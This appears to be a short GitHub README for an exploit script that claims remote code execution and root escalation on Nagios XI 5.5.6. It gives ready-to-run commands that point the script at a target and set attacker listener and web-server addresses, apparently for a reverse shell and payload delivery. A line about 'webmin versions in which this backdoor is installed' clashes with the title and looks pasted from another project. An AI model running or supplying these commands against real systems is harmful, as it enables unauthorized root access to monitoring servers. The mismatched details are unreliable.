# Nagios XI 5.5.6 Remote Code Execution and Privilege Escalation

```
1.  Nagios XI 5.5.6
```

### Script Usage:
#### Tested on v1.890, but should also work for other webmin versions in which this backdoor is installed.
`python3 nagiosxi.py -t https://10.10.10.10 -lh 172.16.1.2 -lp 7777 -wh 172.16.1.2 -wp 8888`

![](https://github.com/ruthvikvegunta/nagiosxi_rce-to-root/blob/master/images/root.png)

`python3 nagiosxi.py -t https://10.10.10.10 -lh 172.16.1.2 -lp 7777 -wh 172.16.1.2 -wp 8888 -shell low`

![](https://github.com/ruthvikvegunta/nagiosxi_rce-to-root/blob/master/images/low_priv.png)
